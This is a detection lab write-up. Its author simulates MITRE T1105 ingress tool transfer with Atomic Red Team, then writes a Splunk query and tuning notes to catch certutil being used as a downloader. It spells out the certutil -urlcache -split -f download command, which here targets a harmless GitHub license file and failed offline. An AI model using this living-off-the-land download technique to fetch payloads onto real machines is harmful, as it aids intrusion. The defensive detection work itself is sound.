# T1105 — Ingress Tool Transfer (certutil download)

**Tactic:** Command and Control  **Technique:** T1105  **Log Source:** Sysmon (XmlWinEventLog) — Process Creation

## What This Attack Does

The attacker pulls tools or malware from an external server onto the compromised
machine. Attackers rarely bring everything upfront — they download what they need
mid-intrusion: a credential dumper, ransomware, a RAT. A favorite trick is
`certutil`, a legitimate Windows certificate utility that can also download files
over HTTP, letting attackers fetch payloads with a trusted, signed binary
(living off the land).

## How I Simulated It

Tool: Atomic Red Team
Command executed on the Windows 11 target (192.168.56.102):

    Invoke-AtomicTest T1105 -TestNumbers 7

Test #7 ("certutil download — urlcache") uses `certutil` to download a file from
a raw GitHub URL:
`certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt`

Note: the download **failed** — the host had no internet access, so `certutil`
returned `ERROR_WINHTTP_NAME_NOT_RESOLVED` (exit code -2147012889). The download
*attempt* was still generated and fully logged — the same trail an attacker
leaves when their payload server is blocked, sinkholed, or offline.

## What Splunk Captured

Sysmon Event ID 1 (Process Creation) fired 5 times across the test:
- User: `WINDOWS\khaled`
- Parent CommandLine: `cmd.exe /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt`
- Child process: `certutil.exe` executing the `-urlcache -split -f` download
- Parent chain: `powershell.exe` → `cmd.exe` → `certutil.exe`

## SPL Detection Query

```spl
index=* sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" "certutil"
| rex field=_raw "Name='Image'>(?P<Image>[^<]+)"
| rex field=_raw "Name='CommandLine'>(?P<CommandLine>[^<]+)"
| rex field=_raw "Name='ParentImage'>(?P<ParentImage>[^<]+)"
| rex field=_raw "Name='User'>(?P<User>[^<]+)"
| rex field=_raw "Name='UtcTime'>(?P<UtcTime>[^<]+)"
| table UtcTime, User, Image, CommandLine, ParentImage
```

## Detection Logic

The query keys on `certutil`, and the high-value signal is the flag combination
`-urlcache -split -f` followed by an `http(s)` URL — that's `certutil` being used
as a downloader, not for its intended certificate work. There is almost no
legitimate reason for an interactive user to run `certutil -urlcache -f
<url>`, which makes this a strong LOLBin (living-off-the-land binary) indicator.
Because it's captured at process creation, the full source URL and output
filename are in the command line — even though this particular download failed at
the network layer.

## False Positives / Tuning

Plain `certutil` is used legitimately for certificate management, so don't alert
on the binary alone. Alert specifically on `certutil` combined with `-urlcache`,
`-split`, `-f`, or a URL argument — that flag pattern is the downloader behavior.
Enrich by extracting the destination URL and checking it against threat intel,
and treat downloads to/from non-corporate hosts (raw GitHub, pastebin, raw IPs)
as higher priority. The same LOLBin logic extends to `bitsadmin`,
`Invoke-WebRequest`, and `curl.exe`, which should be covered by sibling rules.

## Result

Splunk detected the `certutil` download attempt across 5 process-creation events,
capturing the full command line — including the source URL and output filename —
even though the transfer failed with a DNS-resolution error. This shows that a
LOLBin download attempt is fully visible in process-creation logs regardless of
whether the payload actually lands.

## Screenshots

**Attack executed on Windows 11 target (certutil download fails — name not resolved):**
<img width="958" alt="T1105 certutil download attempt on Windows 11" src="https://github.com/user-attachments/assets/ed3649d7-3690-427e-b251-a0ef4e3d2f82" />

**Detection in Splunk — 5 events from the certutil download attempt:**
<img width="1912" alt="T1105 detection in Splunk showing certutil urlcache download" src="https://github.com/user-attachments/assets/2cbd9efe-00ff-4091-932c-802d3b2b8ced" />
